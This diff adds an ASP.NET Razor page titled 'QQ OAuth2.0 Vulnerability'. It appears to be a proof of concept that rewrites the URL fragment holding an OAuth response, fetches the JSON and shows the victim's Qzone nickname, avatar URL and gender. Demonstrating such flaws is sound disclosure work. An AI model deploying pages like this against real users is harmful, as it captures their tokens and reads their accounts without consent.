@@ -1,0 +1,33 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>QQ OAuth2.0 Vulnerability</title>
+    <script src="~/Scripts/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            var jsonUrl = window.location.href.replace("#&#", "&");
+            console.log(jsonUrl);
+            $.getJSON(jsonUrl, null,
+                function (data) {
+                    console.log(data);
+                    $("#nickname").text(data.nickname);
+                    $("#figureurl").text(data.figureurl);
+                    $("#gender").text(data.gender);
+                });
+        });
+    </script>
+</head>
+    <body>
+        <div>The following information are retrieved from Qzone:</div>
+        <div>Nickname: <span id="nickname"></span></div>
+        <div>Figure URL: <span id="figureurl"></span></div>
+        <div>Gender: <span id="gender"></span></div>
+    </body>
+</html>
